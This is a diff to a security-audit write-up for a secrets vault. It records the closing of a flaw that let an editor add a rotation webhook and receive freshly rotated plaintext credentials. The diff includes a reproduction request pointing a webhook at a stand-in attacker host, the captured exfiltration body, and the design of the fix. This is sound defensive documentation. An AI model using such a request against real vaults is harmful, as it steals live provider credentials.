@@ -273,61 +273,84 @@ comment above the rename branch in `VaultHandler.Update`, including its cost
 
 ## (i) Rotation delivery targets are not held to the egress-widening right
 
-**Status:** deliberate, named here because it is the one door the round-3 egress
-work did NOT close in general.
+**Status: CLOSED 2026-08-02 (round 5).** Kept here rather than deleted, because
+what it deferred turned out to be a live blocker and the reasoning for deferring
+it is the part worth remembering.
 
 Adding a rotation target is the same ACT as widening `destination_patterns`:
 `deliverToWebhook` POSTs `{"new_value": <the secret>}` to a URL somebody named,
-and `forgejo_secret` writes the value into a repository. Since 2026-08-02,
-widening `destination_patterns` takes the entry's creator or an instance admin
-(`mayDirectSecretEgress`). Configuring a delivery target still takes only
-`manage`, so any accepted editor of the collection can add one to a secret they
-did not deposit.
+and `forgejo_secret` writes the value into a repository. Until now, widening
+`destination_patterns` took the entry's creator or an instance admin
+(`mayDirectSecretEgress`) while configuring a delivery target took only `manage`,
+so any accepted editor could add one to a secret they did not deposit.
 
-**The escalation that keeps it interesting.** A session-authenticated member can
-already read a shared secret through `/api/vault/unlock` (their own password) and
-through `POST /api/vault/{id}/rotate` (also password-gated), so for them this
-adds nothing. An API-KEY-only caller (a stolen extension key) can do neither, but
-CAN add a webhook target and then set `auto_rotate` with a short interval through
-`PUT /api/vault/{id}`, neither of which asks for a password. The scheduler then
-rotates and hands their endpoint a fresh, live provider credential.
+Three independent reviewers reproduced it end to end: a `vault_only` account (the
+role the PUBLIC invite-redeem endpoint hands out) holding an accepted EDITOR seat
+did
 
-**Why it is not closed in this pass.** Four earlier rounds looked directly at
-"an editor configures a target on somebody else's shared entry" and hardened it
-instead of forbidding it: `ConfiguredBy` is stamped server-side, an `auth_token`
-resolves as the CONFIGURER rather than the entry owner, delivery re-checks that
-the configurer still has write access, leaving a collection purges their targets,
-and a stale panel cannot resurrect a purged one. Four guards encode that
-behaviour as the intended one. Forbidding it is a change to how teams run shared
-rotation, i.e. a product decision, and making it inside a security round would
-have rewritten the premise of those four guards in the same commit that claims no
-regressions.
+```
+PUT /api/vault/{id}/targets
+[{"type":"webhook","webhook_url":"https://attacker-controlled.example/collect"}]
+-> 200, stored, configured_by set to the editor
+```
 
-**What IS closed.** The case this audit is about: an entry wired into the AI
-gateway carries no secret-transmitting delivery target at all, refused at the
-write (`UpdateTargets`) and at delivery (`DeliverRotatedKey`), so the operator's
-provider key cannot be handed to a rotation webhook by anyone.
+and the scheduled rotation POSTed the freshly minted plaintext there. On the wire,
+with the gate removed:
 
-**Narrowed on 2026-08-02.** The other half of that escalation is now gone. It
-needed TWO ungated fields: `auto_rotate` to make the scheduler act, and a
-destination for it to act toward. `provider` and `provider_meta` were the second
-one and were ungated, so the same API-key caller could point the entry at their
-own Grafana or Zitadel instance and let the sweep deliver there, with no rotation
-target involved at all. That now takes the widening right
-(`authorityForEgressChange`). `auto_rotate` stays `manage`-gated and is
-classified `egressTriggersDelivery` in `vaultEntryEgressClass`: it decides
-WHETHER the secret moves, never WHERE, so on its own it can only trigger delivery
-to destinations an authorised principal already chose.
+```
+hosts: [POST attacker-controlled.example/collect]
+body:  {"entry_name":"team-grafana-x","event":"vault.key_rotated","new_value":"...",...}
+```
 
-**Design when picked up.** Gate a NEW secret-transmitting target (one whose
-`rotationTargetIdentity` is not already stored) on `mayDirectSecretEgress`, the
-same helper `destination_patterns` uses, and re-shape the four fixtures so the
-configurer is a principal who may direct egress: the leaver/editor becomes the
-entry's creator in the purge and stale-panel tests, and an admin configures the
-target in the read-authz test so the removed creator is still harvesting somebody
-else's HMAC secret. Consider requiring re-auth (the password `Rotate` already
-asks for) instead, which closes the API-key path specifically while leaving the
-team workflow alone.
+**Why the earlier round deferred it, and why that was wrong.** Four guards
+(leave-purge, the stale-panel version check, `ConfiguredBy` stamping, the target
+read gate) were written on the premise that a member with `manage` may configure
+delivery safely-by-attribution. Closing this changes that premise, so an earlier
+round implemented it, watched those four ABORT preconditions break, and reverted
+it as a product decision rather than a fix. That reasoning treats "four tests
+encode the current behaviour" as evidence the behaviour is intended. It is
+evidence the behaviour was hardened, which is a different thing, and the class
+here is identical to the blocker the same round shipped a fix for.
+
+**What shipped.**
+
+* `VaultHandler.UpdateTargets` calls `decideDeliveryEgress`, which resolves to the
+  same `mayDirectSecretEgress` the ceiling uses. Adding a target whose
+  `rotationTargetIdentity` is not already stored, and which actually transmits the
+  value (`webhook`, `forgejo_secret`), takes the creator or an instance admin.
+* Everything that does not add a destination stays open to `manage`: removing a
+  target, clearing the list, relabelling one, rotating its HMAC signing secret,
+  re-saving the panel unchanged, and configuring a `notify` target. Revocation is
+  not behind the stricter right.
+* `targetStillAuthorized` asks `mayDirectSecretEgress` too, so a row already
+  stored by an editor on a running instance, or arriving through a restored
+  backup, an import or an older binary, is refused at DELIVERY as well. The write
+  gate can only guard writes it sees.
+* `rotationTargetAttribution` adds `auth_token` to the attribution key. Editing
+  which credential is spent as the delivery bearer token re-stamps `ConfiguredBy`
+  to whoever edited it, closing a sibling the old shape could not reach: the
+  destination did not move, so nothing was refused, and the editor's new
+  `auth_token` resolved as the OWNER.
+
+**The four premises, changed deliberately.** Attribution is unchanged and still
+load-bearing (an instance admin or the creator can also be offboarded, and
+`notify` targets are still configured by editors), but it is no longer the only
+thing standing between an editor and the plaintext. Each fixture now uses a
+principal who may direct egress, and says so in place:
+
+| guard | before | now |
+| --- | --- | --- |
+| `TestLeavingACollectionPurgesTheLeaversTargets` | leaver is an editor | leaver is the entry's creator |
+| `TestStalePanelCannotResurrectAPurgedTarget` | leaver is an editor; manager's positive control adds a webhook | leaver is the creator; the manager's positive control is a `notify` target, and adding a webhook is asserted to 403 |
+| `TestUpdateTargetsStampsConfiguringUser` | the editor creates the target | the owner creates it; the editor's unchanged re-save preserves attribution and their `auth_token` swap re-stamps |
+| `TestRemovedMemberCannotReadTargets` | the manager configures the webhook | an instance admin does, so the removed creator is still harvesting somebody else's HMAC secret |
+| `TestOffboardedMemberStopsReceivingTheRotatedSecret`, `TestDisabledUserStopsReceivingTheRotatedSecret` | the editor configures the target | the configurer is the entry's creator |
+
+**What this does NOT close.** `auto_rotate` is still `manage`-gated and still
+classified `egressTriggersDelivery`: it decides WHETHER the secret moves, never
+WHERE. On its own it can now only trigger delivery to destinations an authorised
+principal chose, which is the whole reason it is acceptable, and it is the
+remaining half of the API-key escalation this section used to describe.
 
 ## (j) A meta-derived provider's declared hosts come out of the same column a forged row would carry
 
